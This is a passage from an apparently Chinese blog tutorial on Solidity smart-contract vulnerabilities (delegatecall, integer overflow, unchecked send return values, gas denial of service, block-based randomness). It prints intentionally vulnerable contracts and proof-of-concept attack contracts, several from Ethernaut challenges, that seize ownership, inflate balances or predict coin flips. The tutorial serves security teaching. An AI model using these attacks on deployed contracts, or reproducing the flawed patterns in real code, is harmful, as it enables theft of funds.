class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.11;</span><br><span class="line"></span><br><span class="line">contract A &#123;</span><br><span class="line">    </span><br><span class="line">    address public owner;</span><br><span class="line">    </span><br><span class="line">    function pwn() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Deletest &#123;</span><br><span class="line"></span><br><span class="line">    address public owner;</span><br><span class="line">    address Address;</span><br><span class="line">    </span><br><span class="line">    function set(address target) &#123;</span><br><span class="line">        Address = target;//填入A地址，进行绑定</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function Deletest()  &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function() public &#123;</span><br><span class="line">        Address.delegatecall(msg.data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>给出poc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">contract getcall&#123;</span><br><span class="line">    bytes4 public b = bytes4(keccak256(&quot;pwn()&quot;)) ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>获得b后填入Deletest的fallback中执行，点击owner发现合约所属人已变更。<br>尝试将delegatecall替换为call，发现并不存在此现象</p><h3 id="攻击的例子2-ethernaut的Fallout"><a href="#攻击的例子2-ethernaut的Fallout" class="headerlink" title="攻击的例子2: ethernaut的Fallout"></a>攻击的例子2: ethernaut的Fallout</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.23;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line"></span><br><span class="line">  // public library contracts </span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner; </span><br><span class="line">  uint storedTime;</span><br><span class="line">  // Sets the function signature for delegatecall</span><br><span class="line">  bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));</span><br><span class="line"></span><br><span class="line">  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123;</span><br><span class="line">    timeZone1Library = _timeZone1LibraryAddress; </span><br><span class="line">    timeZone2Library = _timeZone2LibraryAddress; </span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  // set the time for timezone 1</span><br><span class="line">  function setFirstTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone1Library.delegatecall(setTimeSignature, _timeStamp);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // set the time for timezone 2</span><br><span class="line">  function setSecondTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone2Library.delegatecall(setTimeSignature, _timeStamp);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Simple library contract to set the time</span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line"></span><br><span class="line">  // stores a timestamp </span><br><span class="line">  uint storedTime;  </span><br><span class="line"></span><br><span class="line">  function setTime(uint _time) public &#123;</span><br><span class="line">    storedTime = _time;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>poc,先执行一遍合约里的setfirsttime，将攻击合约绑定到timeZone1Library。然后再将setfirsttime修改为自己账户地址，执行后发现owner更改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">    address one;</span><br><span class="line">    address two;</span><br><span class="line">    address public owner;</span><br><span class="line">    function setTime(uint t) public &#123;</span><br><span class="line">        owner=address(t);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意这里变量更改是顺序决定，而不是由变量名决定。</p><hr><h2 id="算术问题（Arithmetic-Issues）"><a href="#算术问题（Arithmetic-Issues）" class="headerlink" title="算术问题（Arithmetic Issues）"></a>算术问题（Arithmetic Issues）</h2><p>在编程语言里算数问题导致的漏洞最多的就是整数溢出，以太坊虚拟机（EVM）的整数又为一个固定大小的数据类型。当执行操作需要固定大小的变量来存储超出变量数据类型范围的数字（或数据）时，会发生数据上溢/下溢。导致产生意料之外的逻辑流程和数值。</p><h3 id="数据溢出的原因"><a href="#数据溢出的原因" class="headerlink" title="数据溢出的原因"></a>数据溢出的原因</h3><p>以8bit整型为例：</p><ul><li>无符号整型: [0,255]<br>– 0000 0000~1111 1111 =&gt; 0~255</li><li>有符号整型: [-128,127]<br>– 负数： 1000 0000~1111 1111  =&gt; -128~1<br>– 正数： 0000 0000~0111 1111  =&gt;  0~127</li></ul><p>无符号整数1111 1111 + 1后数值超过8bit的容量，然后被清零（进位） ，当前内存位置被替换为0000 0000，数值变为<code>0</code>如下图：<br><img src="https://i.loli.net/2019/03/19/5c90ae127b543.png" alt="8.png"><br>有符号整数0111 1111 + 1 后数值变为1000 0000 ，在有符号整数中表示为<code>128</code><br><img src="https://i.loli.net/2019/03/19/5c90ae12721ca.png" alt="9.png"></p><p>以上为上溢，下溢同理</p><p>无符号整数0000 0000 - 1 后 变为 1111 1111 。 数值由<code>0</code> =&gt; <code>255</code></p><p>有符号整数1000 0000 - 1 后数值变为0111 111 ，数值由<code>-128</code> =&gt; <code>127</code></p><h3 id="例子1：时间保险库"><a href="#例子1：时间保险库" class="headerlink" title="例子1：时间保险库"></a>例子1：时间保险库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.10;</span><br><span class="line"></span><br><span class="line">contract TimeLock &#123;</span><br><span class="line">    </span><br><span class="line">    mapping(address =&gt; uint) public balances;</span><br><span class="line">    mapping(address =&gt; uint) public lockTime;</span><br><span class="line">    </span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">        lockTime[msg.sender] = now + 1 weeks;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function increaseLockTime(uint _secondsToIncrease) public &#123;</span><br><span class="line">        lockTime[msg.sender] += _secondsToIncrease;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(balances[msg.sender] &gt; 0);</span><br><span class="line">        require(now &gt; lockTime[msg.sender]);</span><br><span class="line">        balances[msg.sender] = 0;</span><br><span class="line">        msg.sender.transfer(balances[msg.sender]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>合约功能为:将钱存入钱包，一星期之后才能取出来，然后可以自行延长取钱时间。</p><p>此时<code>lockTime[msg.sender] += _secondsToIncrease;</code>未对输入参数进行验证。<br>导致我们将钱存入后取钱时间lockTime为<code>1553649393</code><br>由于合约里默认uint为<strong>无符号的uint256</strong>，表示范围：[0,2^256-1]<br>需要<code>2^256-1553649393</code>得到<code>115792089237316195423570985008687907853269984665640564039457584007911575990543</code><br>填入数据后溢出将时间清0 </p><h3 id="例子2：Token"><a href="#例子2：Token" class="headerlink" title="例子2：Token"></a>例子2：Token</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  function Token(uint _initialSupply) public &#123;</span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;= 0); //存在溢出</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>合约内创建2个余额为0的用户，A给B充值金额</p><p>金额满足<br><code>0  - 115792089237316195423570985008687907853269984665640564039457584007913129639935 = 1</code><br><code>balances[msg.sender] - _value &gt;= 0</code>满足1&gt;0<br>导致B账号内被充入<code>115792089237316195423570985008687907853269984665640564039457584007913129639935</code></p><hr><h2 id="未检查的低级函数调⽤返回值（Unchecked-Return-Values-For-Low-Level-Call）"><a href="#未检查的低级函数调⽤返回值（Unchecked-Return-Values-For-Low-Level-Call）" class="headerlink" title="未检查的低级函数调⽤返回值（Unchecked Return Values For Low Level Call）"></a>未检查的低级函数调⽤返回值（Unchecked Return Values For Low Level Call）</h2><h3 id="这里主要讲可能存在问题的函数："><a href="#这里主要讲可能存在问题的函数：" class="headerlink" title="这里主要讲可能存在问题的函数："></a>这里主要讲可能存在问题的函数：</h3><p>合约调用相关的函数：<code>callcode()</code>、<code>delegatecall()</code>、<code>call()</code></p><p>涉及ether函数：<code>call.value()()</code>、<code>send()</code>、<code>transfer()</code></p><p>上述函数只有callcode未在前文讲述</p><ul><li><strong>callcode</strong><br>本质为delegatecall上个版本,但是在 <code>msg.sender</code> 和 <code>msg.value</code> 的指向上却有差异。</li></ul><p>运行下列合约，对比下细节<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.10;</span><br><span class="line"></span><br><span class="line">contract Bob &#123;</span><br><span class="line">    uint public n;</span><br><span class="line">    address public sender;</span><br><span class="line">    </span><br><span class="line">    function callcodeWendy(address _wendy,uint _n)&#123;</span><br><span class="line">        //sender will be Bob</span><br><span class="line">        _wendy.callcode(bytes4(keccak256(&quot;setN(uint256)&quot;)),_n);</span><br><span class="line">    &#125;</span><br><span class="line">    function delegatecallWendy(address _wendy,uint _n)&#123;</span><br><span class="line">        //sender will be Bob</span><br><span class="line">        _wendy.delegatecall(bytes4(keccak256(&quot;setN(uint256)&quot;)),_n);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Wendy&#123;</span><br><span class="line">    uint public n;</span><br><span class="line">    address public sender;</span><br><span class="line">    function setN(uint _n)&#123;</span><br><span class="line">        n= _n;</span><br><span class="line">        sender = msg.sender;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>callcode的<code>msg.sender</code>为合约本身，<br>delegatecall的<code>msg.sender</code>为外部账户</p><p>再说到</p><ul><li><p><strong><address>.callcode(…) returns (bool)：</address></strong><br>发出低级函数 CALLCODE，失败时返回 false，发送所有可用 gas，可调节。</p></li><li><p><strong><address>.delegatecall(…) returns (bool):</address></strong><br>发出低级函数 DELEGATECALL，失败时返回 false，发送所有可用 gas，可调节。</p></li><li><p><strong><address>.send(uint256 amount) returns (bool):</address></strong><br>向 地址类型 发送数量为 amount 的 Wei，失败时返回 false，发送 2300 gas 的矿工费用，不可调节。</p></li><li><p><strong><address>.call(…) returns (bool):</address></strong><br>发出低级函数 CALL，失败时返回 false，发送所有可用 gas，可调节。</p></li></ul><p>另外，需要注意的是，如果call、callcode、delegatecall、send调用的合约地址不存在，也会返回<code>True</code></p><p>这几个函数都是有返回值的，倘若未对返回值进行判断，可能会产生意料之外的事情。</p><h3 id="例子1：send返回值未做判断"><a href="#例子1：send返回值未做判断" class="headerlink" title="例子1：send返回值未做判断"></a>例子1：send返回值未做判断</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.10;</span><br><span class="line"></span><br><span class="line">contract Money &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    uint256  etherLeft;</span><br><span class="line">    mapping (address =&gt; uint256) public balances; </span><br><span class="line">    </span><br><span class="line">    function Money()&#123;owner=msg.sender;&#125;</span><br><span class="line">    function deposit() payable &#123; balances[msg.sender] += msg.value; &#125;</span><br><span class="line">    </span><br><span class="line">    function withdraw(uint256 _amount) public &#123; //输入单位为ether</span><br><span class="line">        _amount = _amount*10**18;</span><br><span class="line">        require(balances[msg.sender] &gt;= _amount);</span><br><span class="line">        balances[msg.sender] -= _amount;</span><br><span class="line">        etherLeft -= _amount;</span><br><span class="line">        msg.sender.send(_amount);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要问题在于没有对send返回值进行判断，</p><p>当我们账户是合约的时候<code>msg.sender.send(合约地址);</code>触发合约的fallback函数。<br>fallback里面写入错误代码<code>assert(1 == 0);</code>。<br>导致<code>etherLeft -= _amount;</code>能够执行成功，但<code>msg.sender.send(_amount);</code>执行错误转账失败。<br>这就导致：合约里ether被扣，但账户却没得到ether转账<br>给出测试poc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">contract attackself&#123;</span><br><span class="line">    address owner;</span><br><span class="line">    address attacker;</span><br><span class="line">    address target;</span><br><span class="line"></span><br><span class="line">    function attackself() payable  &#123;attacker = msg.sender;&#125;</span><br><span class="line">    </span><br><span class="line">    function deposit (address _target) payable &#123;</span><br><span class="line">        target = _target;</span><br><span class="line">        target.call.value(msg.value)(bytes4(keccak256(&quot;deposit()&quot;))); </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function withdraw (uint256 _amount)  &#123;</span><br><span class="line">        target.call(bytes4(keccak256(&quot;withdraw(uint256 _amount)&quot;)), _amount);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    function () &#123;</span><br><span class="line">        assert(1 == 0);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="例子2-Etherpot"><a href="#例子2-Etherpot" class="headerlink" title="例子2:Etherpot"></a>例子2:Etherpot</h3><p><a href="https://github.com/etherpot/contract/blob/master/app/contracts/lotto.sol" target="_blank" rel="noopener">Etherpot源码</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">function cash(uint roundIndex, uint subpotIndex)&#123;</span><br><span class="line"></span><br><span class="line">        var subpotsCount = getSubpotsCount(roundIndex);</span><br><span class="line"></span><br><span class="line">        if(subpotIndex&gt;=subpotsCount)</span><br><span class="line">            return;</span><br><span class="line"></span><br><span class="line">        var decisionBlockNumber = getDecisionBlockNumber(roundIndex,subpotIndex);</span><br><span class="line"></span><br><span class="line">        if(decisionBlockNumber&gt;block.number)</span><br><span class="line">            return;</span><br><span class="line"></span><br><span class="line">        if(rounds[roundIndex].isCashed[subpotIndex])</span><br><span class="line">            return;</span><br><span class="line">        //Subpots can only be cashed once. This is to prevent double payouts</span><br><span class="line"></span><br><span class="line">        var winner = calculateWinner(roundIndex,subpotIndex);    </span><br><span class="line">        var subpot = getSubpot(roundIndex);</span><br><span class="line"></span><br><span class="line">        winner.send(subpot);//注意这里及下一行</span><br><span class="line"></span><br><span class="line">        rounds[roundIndex].isCashed[subpotIndex] = true;</span><br><span class="line">        //Mark the round as cashed</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有对send返回值进行验证，此时用：通过耗尽 Gas、通过故意抛出回退函数的合约、堆栈深度攻击等方法。</p><p>例如使用上个例子中fallback调用<code>assert(1==0)</code>抛出错误<br>使赢家没有实际拿到ether，合约却显示已支付ether。</p><hr><h2 id="拒绝服务（Denial-of-Service）"><a href="#拒绝服务（Denial-of-Service）" class="headerlink" title="拒绝服务（Denial of Service）"></a>拒绝服务（Denial of Service）</h2><p>攻击者通过在他们的智能合约中反复的调用某些命令来让客户端难以处理这些计算，当gas使用达到上限时,或者调用其他合约触发fallback时，都有可能导致意外错误，无法执行代码</p><h3 id="例子1"><a href="#例子1" class="headerlink" title="例子1"></a>例子1</h3><p><a href="#攻击的例子2-利用fallback中触发revert导致合约卡死">跳转前文例子</a></p><h3 id="例子2"><a href="#例子2" class="headerlink" title="例子2"></a>例子2</h3><p>来自DASP中例子：调⽤者可以决定下⼀个函数调⽤将奖励谁<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function selectNextWinners(uint256 _largestWinner) &#123;</span><br><span class="line">for(uint256 i = 0; i &lt; largestWinner, i++) &#123; </span><br><span class="line"> // heavy code</span><br><span class="line"> &#125;</span><br><span class="line"> largestWinner = _largestWinner;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>由于合约每步代码都需要消耗gas，每个区块/合约又有最大gas限制。当合约执行gas超出gas limit的时候所有操作会被重置，抛出错误<br>因为传入参数<code>largestWinner</code>可控,当我们传入超大数66666，使<code>largestWinner = _largestWinner;</code>无法被执行</p><h3 id="例子3"><a href="#例子3" class="headerlink" title="例子3"></a>例子3</h3><blockquote><p><a href="https://github.com/LCTF/LCTF2018/tree/master/Writeup/gg%20bank" target="_blank" rel="noopener">https://github.com/LCTF/LCTF2018/tree/master/Writeup/gg%20bank</a></p></blockquote><hr><h2 id="可预测的随机处理（Bad-Randomness）"><a href="#可预测的随机处理（Bad-Randomness）" class="headerlink" title="可预测的随机处理（Bad Randomness）"></a>可预测的随机处理（Bad Randomness）</h2><blockquote><p>理论知识：<a href="https://xz.aliyun.com/t/3681" target="_blank" rel="noopener">https://xz.aliyun.com/t/3681</a></p></blockquote><p>伪随机问题一直都存在于现代计算机系统中，简单的可以分为<strong>真随机数</strong>和<strong>伪随机数</strong>。</p><p>随机数有3个特性，具体如下：</p><ul><li>随机性：不存在统计学偏差，是完全杂乱的数列，即分布均匀性和独立性</li><li>不可预测性：不能从过去的数列推测出下一个出现的数</li><li>不可重现性：除非将数列本身保存下来，否则不能重现相同的数列</li></ul><p>为随机数中又分为<strong>强伪随机数</strong>和<strong>弱伪随机数</strong></p><p>三者区别：</p><ul><li><strong>弱伪随机数</strong>：只需要满足<strong>随机性</strong></li><li><strong>强位随机数</strong>：需要满足<strong>随机性</strong>和<strong>不可预测性</strong></li><li><strong>真随机数</strong> ：需要同时<strong>满足3个特性</strong></li></ul><p>但是在开放的区块链中，像在以太坊智能合约中编写的基于随机数的处理逻辑感觉就有点不切实际了，由于人人都能访问链上数据，合约中的存储数据都能在链上查询分析得到。如果合约代码没有严格考虑到链上数据公开的问题去使用随机数，可能会被攻击者恶意利用来进行 “作弊”</p><ul><li><p><strong>block.blockhash(uint blockNumber) returns (bytes32)</strong>：<br>指定区块的区块哈希——仅可用于最新的 256 个区块且不包括当前区块；而 blocks 从 0.4.22 版本开始已经不推荐使用，由 <code>blockhash(uint blockNumber)</code> 代替</p></li><li><p><strong>block.timestamp (uint)</strong>:<br>自 unix epoch 起始当前区块以秒计的时间戳</p></li><li><p><strong>now (uint)</strong> :<br>目前区块时间戳（block.timestamp）</p></li><li><p><strong>block.difficulty (uint)</strong>:<br>当前区块难度</p></li><li><p><strong>block.gaslimit (uint)</strong>:<br>当前区块 gas 限额</p></li><li><p><strong>block.coinbase (address)</strong>:<br>挖出当前区块的矿工地址</p></li></ul><p>根据以上几种函数生成的随机数都是将区块变量作为随机的熵，然而区块变量是不安全的，在一定情况下是可操控的。</p><p>下列通过几个区块变量生成随机值：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract random&#123;</span><br><span class="line">   function difficulty() public returns(uint256) &#123;</span><br><span class="line">        uint256 random = uint256(keccak256(block.difficulty,now));</span><br><span class="line">        return  random%10;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function blockhash()  public returns(bytes32) &#123;</span><br><span class="line">      bytes32 blockhash =  block.blockhash(block.number);</span><br><span class="line">      return blockhash;</span><br><span class="line">    &#125;</span><br><span class="line">    function timestamp() public returns(uint256) &#123;</span><br><span class="line">      uint256 timestamp =  uint256(keccak256(block.timestamp)) % 2;</span><br><span class="line">      return timestamp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;0&quot;: &quot;bytes32: 0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span><br><span class="line">&#125;</span><br><span class="line">    &#123;</span><br><span class="line">    &quot;0&quot;: &quot;uint256: 5&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">    &quot;0&quot;: &quot;uint256: 0&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>许多合约使用了<code>block.blockhash(block.number)</code>这个函数作为生成随机数的种子.<br>但<code>block.blockhash()</code> 只能使用近 256 个块的块号来获取 Hash 值，并且还强调了不包含当前块，如果使用当前块进行计算 <code>block.blockhash(block.numbber)</code>其结果始终为 <code>0</code></p><h3 id="例子1：Coin-Flip"><a href="#例子1：Coin-Flip" class="headerlink" title="例子1：Coin Flip"></a>例子1：Coin Flip</h3><p>来自ethernaut的题目：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  function CoinFlip() public &#123;</span><br><span class="line">    consecutiveWins = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = uint256(block.blockhash(block.number-1));</span><br><span class="line"></span><br><span class="line">    if (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">    if (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      consecutiveWins = 0;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>FACTOR为2^255，结果只有true或false<br>可以将题目类比为投硬币猜正反。</p><p>通关条件</p><ul><li>猜对10次硬币的情况</li></ul><p>这里主要问题在于<code>uint256(block.blockhash(block.number-1));</code>生成的随机数并不可靠。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">contract attack &#123;</span><br><span class="line">  CoinFlip fliphack;</span><br><span class="line">  address instance_address = xxx;</span><br><span class="line">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  function attack() &#123;</span><br><span class="line">    fliphack = CoinFlip(instance_address);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function predict() public view returns (bool)&#123;</span><br><span class="line">    uint256 blockValue = 